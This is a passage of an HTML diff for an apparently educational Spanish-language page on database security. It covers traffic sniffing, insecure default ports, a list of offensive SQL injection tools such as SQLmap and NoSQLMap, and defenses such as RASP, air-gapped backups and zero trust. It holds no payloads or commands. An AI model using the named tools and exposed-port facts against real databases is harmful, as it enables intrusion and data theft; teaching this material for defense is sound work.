+                    <div class="p-3 rounded-lg mr-4" style="background-color: var(--bg-secondary); color: var(--text-primary);"><i data-lucide="network"></i></div>
+                    <div>
+                        <h4 class="font-bold" style="color: var(--text-primary);">Datos en Tránsito (Sniffing)</h4>
+                        <p class="text-xs mt-1" style="color: var(--text-secondary);">
+                            Intercepción de tráfico de base de datos no cifrado. Un atacante en la red interna puede capturar consultas SQL y resultados en texto plano.
+                            <br><span class="text-primary-color font-semibold">Mitigación:</span> Uso forzoso de TLS/SSL para todas las conexiones a la base de datos.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Insecure Default Configurations -->
+                <div class="flex items-start p-4 rounded-xl border bg-tertiary" style="border-color: var(--text-tertiary);">
+                    <div class="p-3 rounded-lg mr-4" style="background-color: var(--bg-secondary); color: var(--text-primary);"><i data-lucide="settings"></i></div>
+                    <div>
+                        <h4 class="font-bold" style="color: var(--text-primary);">Configuraciones Inseguras por Defecto</h4>
+                        <p class="text-xs mt-1" style="color: var(--text-secondary);">
+                            Muchos sistemas (MongoDB, ElasticSearch) vienen con puertos abiertos (27017, 9200) y sin contraseña por defecto.
+                            <br><span class="text-primary-color font-semibold">Riesgo:</span> Indexación automática por motores como Shodan y secuestro inmediato de datos.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 7: Security Tools Arsenal -->
+        <section id="herramientas" class="tab-content hidden animate-fade-in">
+            <div class="glass-card p-8 rounded-xl">
+                <h2 class="text-2xl font-bold mb-6" style="color: var(--text-primary);">Arsenal Ofensivo de Auditoría</h2>
+                <p class="text-sm mb-6" style="color: var(--text-primary);">Herramientas estándar utilizadas por auditores y atacantes para identificar vulnerabilidades.</p>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                    <div class="p-4 rounded border bg-primary-soft hover-bg-primary-soft transition-all cursor-default border-primary-color">
+                        <h4 class="font-bold" style="color: var(--text-primary);">SQLmap</h4>
+                        <p class="text-xs mt-2" style="color: var(--text-primary);">El estándar de la industria. Detecta, explota y puede tomar control del sistema operativo.</p>
+                    </div>
+                    <div class="p-4 border rounded hover-border-primary-color transition-colors bg-tertiary border-tertiary">
+                        <h4 class="font-bold" style="color: var(--text-primary);">BBQSQL</h4>
+                        <p class="text-xs mt-2" style="color: var(--text-secondary);">Framework Python para Blind SQLi. Agnóstico a la base de datos y altamente configurable.</p>
+                    </div>
+                    <div class="p-4 border rounded hover-border-primary-color transition-colors bg-tertiary border-tertiary">
+                        <h4 class="font-bold" style="color: var(--text-primary);">NoSQLMap</h4>
+                        <p class="text-xs mt-2" style="color: var(--text-secondary);">Automatización de ataques a MongoDB y CouchDB.</p>
+                    </div>
+                    <div class="p-4 border rounded hover-border-primary-color transition-colors bg-tertiary border-tertiary">
+                        <h4 class="font-bold" style="color: var(--text-primary);">jSQL Injection</h4>
+                        <p class="text-xs mt-2" style="color: var(--text-secondary);">Interfaz gráfica Java. Ligera y soporta 33 motores de base de datos diferentes.</p>
+                    </div>
+                    <div class="p-4 border rounded hover-border-primary-color transition-colors bg-tertiary border-tertiary">
+                        <h4 class="font-bold" style="color: var(--text-primary);">SQLSus</h4>
+                        <p class="text-xs mt-2" style="color: var(--text-secondary);">Herramienta Perl optimizada para MySQL. Permite clonar la estructura de la BD.</p>
+                    </div>
+                    <div class="p-4 border rounded hover-border-primary-color transition-colors bg-tertiary border-tertiary">
+                        <h4 class="font-bold" style="color: var(--text-primary);">DSSS</h4>
+                        <p class="text-xs mt-2" style="color: var(--text-secondary);">"Damn Small SQLi Scanner". Script minimalista para detección rápida sin explotación pesada.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 8: Defense Strategies -->
+        <section id="mitigacion" class="tab-content hidden animate-fade-in">
+            <div class="glass-card p-8 rounded-xl shadow-lg mb-8">
+                <h2 class="text-2xl font-bold text-secondary-color mb-6">Estrategia de Defensa 2025</h2>
+                
+                <!-- Expandable defense strategies accordion -->
+                <div class="space-y-4" id="accordion-container">
+                    <div class="accordion-item rounded-lg overflow-hidden bg-tertiary">
+                        <button class="accordion-header w-full px-6 py-4 flex justify-between items-center text-left hover-bg transition-colors">
+                            <span class="font-bold" style="color: var(--text-primary);">1. RASP (Runtime Application Self-Protection)</span>
+                            <span class="text-primary-color"><i data-lucide="plus"></i></span>
+                        </button>
+                        <div class="accordion-content hidden px-6 py-4 border-t" style="background-color: var(--bg-primary); border-color: var(--text-tertiary);">
+                            <p class="text-sm" style="color: var(--text-secondary);">Más allá del WAF. RASP se ejecuta dentro de la aplicación e inspecciona las consultas SQL antes de que lleguen a la base de datos, bloqueando ataques en tiempo real, incluso si el tráfico parece legítimo.</p>
+                        </div>
+                    </div>
+
+                    <div class="accordion-item rounded-lg overflow-hidden bg-tertiary">
+                        <button class="accordion-header w-full px-6 py-4 flex justify-between items-center text-left hover-bg transition-colors">
+                            <span class="font-bold" style="color: var(--text-primary);">2. Backups Inmutables y Air-Gapped</span>
+                            <span class="text-primary-color"><i data-lucide="plus"></i></span>
+                        </button>
+                        <div class="accordion-content hidden px-6 py-4 border-t" style="background-color: var(--bg-primary); border-color: var(--text-tertiary);">
+                            <p class="text-sm" style="color: var(--text-secondary);">El Ransomware moderno busca y destruye backups online. La solución es usar almacenamiento WORM (Write Once Read Many) y mantener copias desconectadas físicamente (Air-Gapped).</p>
+                        </div>
+                    </div>
+
+                    <div class="accordion-item rounded-lg overflow-hidden bg-tertiary">
+                        <button class="accordion-header w-full px-6 py-4 flex justify-between items-center text-left hover-bg transition-colors">
+                            <span class="font-bold" style="color: var(--text-primary);">3. Zero Trust en Base de Datos</span>
+                            <span class="text-primary-color"><i data-lucide="plus"></i></span>
+                        </button>
+                        <div class="accordion-content hidden px-6 py-4 border-t" style="background-color: var(--bg-primary); border-color: var(--text-tertiary);">
+                            <p class="text-sm" style="color: var(--text-secondary);">La base de datos no debe confiar ciegamente en la red interna. Se debe implementar autenticación fuerte (MFA) y mTLS (Mutual TLS) para validar cada conexión, no solo el perímetro.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="accordion-item rounded-lg overflow-hidden bg-tertiary">
+                        <button class="accordion-header w-full px-6 py-4 flex justify-between items-center text-left hover-bg transition-colors">
+                            <span class="font-bold" style="color: var(--text-primary);">4. CSPM (Cloud Security Posture Management)</span>
+                            <span class="text-primary-color"><i data-lucide="plus"></i></span>
+                        </button>
+                        <div class="accordion-content hidden px-6 py-4 border-t" style="background-color: var(--bg-primary); border-color: var(--text-tertiary);">
+                            <p class="text-sm" style="color: var(--text-secondary);">Herramientas automatizadas que escanean continuamente la nube (AWS, Azure) para detectar malas configuraciones, como buckets S3 públicos o grupos de seguridad demasiado permisivos, antes de que sean explotados.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- ==========================================
+         FOOTER
+         ========================================== -->
+    <footer class="text-center py-6 border-t" style="background-color: var(--bg-tertiary); border-color: var(--text-tertiary);">
+        <p class="text-sm font-medium" style="color: var(--text-secondary);">IsaBosDev &copy; 2025 | Security Research</p>
+        <p class="text-xs mt-1" style="color: var(--text-secondary);">Generado para análisis educativo de seguridad en datos.</p>
+    </footer>
+
+    <!-- Custom JavaScript -->
+    <script src="script.js"></script>
+</body>
+</html>
